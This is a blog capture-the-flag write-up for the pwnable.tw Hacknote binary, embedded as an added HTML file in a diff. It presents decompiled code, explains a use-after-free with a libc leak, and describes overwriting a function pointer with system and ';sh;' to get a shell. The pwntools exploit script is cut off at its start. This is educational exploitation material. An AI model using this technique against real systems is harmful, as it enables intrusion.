@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hacknote (200 pts) - pwnable.tw | NguyenDD&#39;s Blog</title>
+<meta name="keywords" content="pwnable.tw">
+<meta name="description" content="
+ 0x1. Initial Reconnaissance 
+file
+↪ file hacknote
+hacknote: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
+checksec
+↪ checksec --file=hacknote
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	No	0		2		hacknote
+./hacknote
+↪ ./hacknote
+----------------------
+       HackNote       
+----------------------
+ 1. Add note          
+ 2. Delete note       
+ 3. Print note        
+ 4. Exit              
+----------------------
+Your choice :
+
+0x2. Reverse Engineering
+Add_note
+unsigned int sub_8048646()
+{
+  int v0; // ebx
+  int v2; // [esp-Ch] [ebp-34h]
+  int v3; // [esp-Ch] [ebp-34h]
+  int v4; // [esp-8h] [ebp-30h]
+  int v5; // [esp-8h] [ebp-30h]
+  int v6; // [esp-4h] [ebp-2Ch]
+  int i; // [esp&#43;Ch] [ebp-1Ch]
+  int v8; // [esp&#43;10h] [ebp-18h]
+  char v9[8]; // [esp&#43;14h] [ebp-14h] BYREF
+  unsigned int v10; // [esp&#43;1Ch] [ebp-Ch]
+
+  v10 = __readgsdword(0x14u);
+  if ( dword_804A04C &lt;= 5 )
+  {
+    for ( i = 0; i &lt;= 4; &#43;&#43;i )
+    {
+      if ( !dword_804A050[i] )
+      {
+        dword_804A050[i] = malloc(8);
+        if ( !dword_804A050[i] )
+        {
+          puts(&#34;Alloca Error&#34;);
+          exit(-1, v2, v4, v6);
+        }
+        *(_DWORD *)dword_804A050[i] = sub_804862B;
+        printf(&#34;Note size :&#34;);
+        read(0, v9, 8);
+        v8 = atoi(v9);
+        v0 = dword_804A050[i];
+        *(_DWORD *)(v0 &#43; 4) = malloc(v8);
+        if ( !*(_DWORD *)(dword_804A050[i] &#43; 4) )
+        {
+          puts(&#34;Alloca Error&#34;);
+          exit(-1, v3, v5, v6);
+        }
+        printf(&#34;Content :&#34;);
+        read(0, *(_DWORD *)(dword_804A050[i] &#43; 4), v8);
+        puts(&#34;Success !&#34;);
+        &#43;&#43;dword_804A04C;
+        return __readgsdword(0x14u) ^ v10;
+      }
+    }
+  }
+  else
+  {
+    puts(&#34;Full&#34;);
+  }
+  return __readgsdword(0x14u) ^ v10;
+}
+Delete_note
+unsigned int sub_80487D4()
+{
+  int v1; // [esp-Ch] [ebp-24h]
+  int v2; // [esp-8h] [ebp-20h]
+  int v3; // [esp-4h] [ebp-1Ch]
+  int v4; // [esp&#43;4h] [ebp-14h]
+  char v5[4]; // [esp&#43;8h] [ebp-10h] BYREF
+  unsigned int v6; // [esp&#43;Ch] [ebp-Ch]
+
+  v6 = __readgsdword(0x14u);
+  printf(&#34;Index :&#34;);
+  read(0, v5, 4);
+  v4 = atoi(v5);
+  if ( v4 &lt; 0 || v4 &gt;= dword_804A04C )
+  {
+    puts(&#34;Out of bound!&#34;);
+    _exit(0, v1, v2, v3);
+  }
+  if ( dword_804A050[v4] )
+  {
+    free(*(_DWORD *)(dword_804A050[v4] &#43; 4));
+    free(dword_804A050[v4]);
+    puts(&#34;Success&#34;);
+  }
+  return __readgsdword(0x14u) ^ v6;
+Print_note
+unsigned int sub_80488A5()
+{
+  int v1; // [esp-Ch] [ebp-24h]
+  int v2; // [esp-8h] [ebp-20h]
+  int v3; // [esp-4h] [ebp-1Ch]
+  int v4; // [esp&#43;4h] [ebp-14h]
+  char v5[4]; // [esp&#43;8h] [ebp-10h] BYREF
+  unsigned int v6; // [esp&#43;Ch] [ebp-Ch]
+
+  v6 = __readgsdword(0x14u);
+  printf(&#34;Index :&#34;);
+  read(0, v5, 4);
+  v4 = atoi(v5);
+  if ( v4 &lt; 0 || v4 &gt;= dword_804A04C )
+  {
+    puts(&#34;Out of bound!&#34;);
+    _exit(0, v1, v2, v3);
+  }
+  if ( dword_804A050[v4] )
+    (*(void (__cdecl **)(int))dword_804A050[v4])(dword_804A050[v4]);
+  return __readgsdword(0x14u) ^ v6;
+}
+
+0x3. Analysis
+Take a look at Add_note function, you can see that a variable at 0x804a4c (data section) used to make sure that you just get to use add_note option 6 times by checking whether it&rsquo;s less than 6 or not at the beginning and increasing it by 1 after adding a new note. But see inside the if condition, they just allow us to use add_note option 5 times. The reason is that they use a 5-variables array, stored at 0x804a050, and when you choose the option 1, they will check whether are there any available slot, if not they do nothing.
+When you add a new note, they will create a chunk of 8 bytes and a chunk of your chosen size. The first chunk will be stored at the array i mentioned above, and used as a struct(the first element stores a funtion (sub_804862B), the second one stores the address of the second chunk).">
+<meta name="author" content="">
+<link rel="canonical" href="//localhost:1313/blogs/hacknote/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/blogs/hacknote/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="NguyenDD&#39;s Blog (Alt + H)">NguyenDD&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/blogs" title="Blogs">
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Hacknote (200 pts) - pwnable.tw
+    </h1>
+    <div class="post-meta"><span title='2025-08-29 12:42:01 +0700 +07'>August 29, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><hr>
+<h2 id="0x1-initial-reconnaissance"><!-- raw HTML omitted --> 0x1. Initial Reconnaissance <!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x1-initial-reconnaissance">#</a></h2>
+<h3 id="file">file<a hidden class="anchor" aria-hidden="true" href="#file">#</a></h3>
+<pre tabindex="0"><code>↪ file hacknote
+hacknote: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
+</code></pre><h3 id="checksec">checksec<a hidden class="anchor" aria-hidden="true" href="#checksec">#</a></h3>
+<pre tabindex="0"><code>↪ checksec --file=hacknote
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	No	0		2		hacknote
+</code></pre><h3 id="hacknote">./hacknote<a hidden class="anchor" aria-hidden="true" href="#hacknote">#</a></h3>
+<pre tabindex="0"><code>↪ ./hacknote
+----------------------
+       HackNote       
+----------------------
+ 1. Add note          
+ 2. Delete note       
+ 3. Print note        
+ 4. Exit              
+----------------------
+Your choice :
+</code></pre><hr>
+<h2 id="0x2-reverse-engineering"><!-- raw HTML omitted -->0x2. Reverse Engineering<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x2-reverse-engineering">#</a></h2>
+<h3 id="add_note">Add_note<a hidden class="anchor" aria-hidden="true" href="#add_note">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_8048646</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [esp-Ch] [ebp-34h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [esp-Ch] [ebp-34h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [esp-8h] [ebp-30h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [esp-8h] [ebp-30h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp-4h] [ebp-2Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [esp+Ch] [ebp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// [esp+10h] [ebp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v9[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [esp+14h] [ebp-14h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v10; <span style="color:#75715e">// [esp+1Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( dword_804A04C <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>dword_804A050[i] )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        dword_804A050[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>dword_804A050[i] )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Alloca Error&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, v2, v4, v6);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)dword_804A050[i] <span style="color:#f92672">=</span> sub_804862B;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Note size :&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v9, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>        v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(v9);
+</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">=</span> dword_804A050[i];
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(v0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(v8);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_DWORD <span style="color:#f92672">*</span>)(dword_804A050[i] <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Alloca Error&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, v3, v5, v6);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Content :&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(dword_804A050[i] <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>), v8);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Success !&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>dword_804A04C;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>) <span style="color:#f92672">^</span> v10;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Full&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>) <span style="color:#f92672">^</span> v10;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="delete_note">Delete_note<a hidden class="anchor" aria-hidden="true" href="#delete_note">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_80487D4</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [esp-Ch] [ebp-24h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [esp-8h] [ebp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [esp-4h] [ebp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [esp+4h] [ebp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [esp+8h] [ebp-10h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index :&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v5, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(v5);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;=</span> dword_804A04C )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Out of bound!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_exit</span>(<span style="color:#ae81ff">0</span>, v1, v2, v3);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( dword_804A050[v4] )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(dword_804A050[v4] <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(dword_804A050[v4]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Success&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>) <span style="color:#f92672">^</span> v6;
+</span></span></code></pre></div><h3 id="print_note">Print_note<a hidden class="anchor" aria-hidden="true" href="#print_note">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_80488A5</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [esp-Ch] [ebp-24h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [esp-8h] [ebp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [esp-4h] [ebp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [esp+4h] [ebp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [esp+8h] [ebp-10h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index :&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v5, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(v5);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;=</span> dword_804A04C )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Out of bound!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_exit</span>(<span style="color:#ae81ff">0</span>, v1, v2, v3);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( dword_804A050[v4] )
+</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__cdecl</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">int</span>))dword_804A050[v4])(dword_804A050[v4]);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>) <span style="color:#f92672">^</span> v6;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="0x3-analysis"><!-- raw HTML omitted -->0x3. Analysis<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x3-analysis">#</a></h2>
+<p>Take a look at Add_note function, you can see that a variable at 0x804a4c (data section) used to make sure that you just get to use add_note option 6 times by checking whether it&rsquo;s less than 6 or not at the beginning and increasing it by 1 after adding a new note. But see inside the if condition, they just allow us to use add_note option 5 times. The reason is that they use a 5-variables array, stored at 0x804a050, and when you choose the option 1, they will check whether are there any available slot, if not they do nothing.
+When you add a new note, they will create a chunk of 8 bytes and a chunk of your chosen size. The first chunk will be stored at the array i mentioned above, and used as a struct(the first element stores a funtion (sub_804862B), the second one stores the address of the second chunk).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">sub_804862B</span>(<span style="color:#66d9ef">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s see the Print_note, they will call the function stored at the the first chunk (it&rsquo;s the function above), and pass its address to this function too. Finally, they will print everything at the address stored at the second element.
+Next, the Delete_note function, they just free the second chunk, then the first one, but <!-- raw HTML omitted -->they don&rsquo;t assign the element of the array back to null or 0<!-- raw HTML omitted -->, that&rsquo;s why I tell you that, you just get to use add_note functions 5 times.</p>
+<hr>
+<h2 id="0x4-exploit"><!-- raw HTML omitted -->0x4. Exploit<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x4-exploit">#</a></h2>
+<p>When you free a chunk, if its size is greater than 80 bytes and isn&rsquo;t adjacent to the top chunk (to do this just add another note in the middle), it will be put in unsorted bin (doubly linked-list) and if there is just only one chunk in unsorted bin, its previous and next pointer would point to the address of main arena in libc (the manager of bins). And when you add a new note having exactly the same size, they will give you the chunk from unsorted bin but don&rsquo;t reset this chunk, that means you can get the address of main arena and calculate the libc_base address, system&rsquo;s address, etc&hellip;</p>
+<h6 id="after-free-a-chunk-of-100-bytes">After free a chunk of 100 bytes:<a hidden class="anchor" aria-hidden="true" href="#after-free-a-chunk-of-100-bytes">#</a></h6>
+<pre tabindex="0"><code>Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x804b010
+Size: 0x68 (with flag bits: 0x69)
+fd: 0xf7fcb7b0
+bk: 0xf7fcb7b0
+</code></pre><h6 id="add-a-new-note-of-100-bytes-after-free-and-overwrite-the-first-4-bytes">Add a new note of 100 bytes after free and overwrite the first 4 bytes:<a hidden class="anchor" aria-hidden="true" href="#add-a-new-note-of-100-bytes-after-free-and-overwrite-the-first-4-bytes">#</a></h6>
+<pre tabindex="0"><code>pwndbg&gt; x/2wx 0x804b018
+0x804b018:	0x41414141	0xf7fcb70a
+</code></pre><p>As I analysed above, when adding a new note, they create a chunk of 8 bytes containing the function that print out our note, I will call it <!-- raw HTML omitted --> the special chunk <!-- raw HTML omitted -->. As a result, if we delete 2 notes and add a new note of 8 bytes, we will get a special chunk of the notes we just deleted and get to overwrite them and run our desired function, in that case will be system function. Because they pass the address of the special chunk to my function, we can write the system address and &ldquo;;sh;&rdquo; to the special chunk. So that, when we choose to print note, the system function will run the address of system (that&rsquo;s should be error) and then the command &ldquo;sh&rdquo;, next will run the command right after &lsquo;;&rsquo;.</p>
+<h6 id="exploit">Exploit:<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./hacknote_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc_32.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
